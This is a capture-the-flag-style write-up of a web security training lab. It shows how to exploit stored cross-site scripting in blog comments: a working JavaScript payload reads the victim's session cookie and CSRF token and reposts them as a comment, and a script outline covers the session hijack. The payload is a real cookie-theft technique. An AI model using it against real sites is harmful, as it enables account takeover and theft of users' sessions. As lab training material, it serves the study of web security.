### Lab: Exploiting cross-site scripting to steal cookies

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

_Note_  
_To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server._

_Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie._

_____

Analysis and Exploit:

1. Tried to post the payload ```<script>alert(document.domain)</script>``` as comment and passed with no filter to block it

2. Insert a comment with hidden id (like "heregoesthecookie")
    - ```<p id="heregoesthecookie">Cookies go here</p>```

3. Script in comment to get the element id (above) and change the text with the cookie of the victim

```html
<script> var cookies = document.cookie; document.getElementById('heregoesthecookie').innerText=cookies </script>
```

Works only in line... only the victim can see the cookies... force it to post it as a comment

Payload
```html
<script>
document.body.onload = function() {
    // GET COOKIES
    var cookies = document.cookie;
    // GET CSRF TOKEN FROM HTML
    var csrf = document.getElementsByName("csrf")[0].defaultValue;
    // GET DOMAIN
    var domain = document.domain;
    // STORE VALUES NEEDED TO POST THE SCRIPT
    var details = {
        'csrf': csrf,
        'postId': 2,
        'comment': cookies,
        'name': 'victim',
        'email': 'victim@victim',
        'website': 'http://hack'
    };
    // PREPARE AN EMPTY ARRAY WHICH WILL BE FILLED WITH ENCODED VALUES FROM details
    var formBody = [];
    // ENCODED IN TURN EACH KEY/VALUE PAIR FROM DICTIONARY details
    for (var property in details) {
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(details[property]);
        // ADD EACH PAIR TO THE ARRAY AND "JOIN" KEYS AND VALUES IN A STRING CONCATENATION
        formBody.push(encodedKey + "=" + encodedValue);
    }
    // CONCAT ARRAY VALUES WITH & CHAR
    formBody = formBody.join("&");
    // POST THE COMMENT
    fetch("https://"+domain+"/post/comment", {
        method: "POST",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: formBody
    });
}
</script>
```

4. Take note of the victim cookie (and secret) and use it to take over the victim session
     - Example:   
     secret=eo1IaaEn16knMWoC7UkViWb9aBZBHNA0; session=JzKAQpQKfCygWF4xfxdw8WZaYAWkS9NL

5. Check user identity
    - if ```<a href="/my-account?id=administrator">``` in the page: ok
    - if "Your username is: administrator" is **/my-account?id=administrator**: ok


_____

Script:

1. ARGUMENTS AND ERRORS

Take the URL as argument. If no argument or more than one are given, print usage instructions.

2. STORE PAYLOAD AS USER COMMENT

- POST **/post/comment**
- Params required:
    - csrf
    - postId
    - comment
    - name
    - email
    - website

csrf = get csrf token from **/post?postId=1**  
postId = 1  
comment = javascript payload  
name = random name (like _attacker_)  
email = random email (like _att@cker_)  
website = random website (like _http://hack_)  

3. EXTRACT COOKIE FROM USER'S COMMENTS

- GET **/post?postId=2** (or the postId value specified in the xss payload)

Since the target user (administrator) makes use of two cookies, secret and session, we can focus on those to find the right cookie to extract.  

```html 
<p>secret=eo1IaaEn16knMWoC7UkViWb9aBZBHNA0; session=JzKAQpQKfCygWF4xfxdw8WZaYAWkS9NL</p>
```

4. IMPERSONATE THE VICTIM

- GET **/**
- Params:
    - session=[cookie from step 3]

If ```<a href="/my-account?id=administrator">``` is in the page, it means the stolen session cookie is valid and from the user administrator.
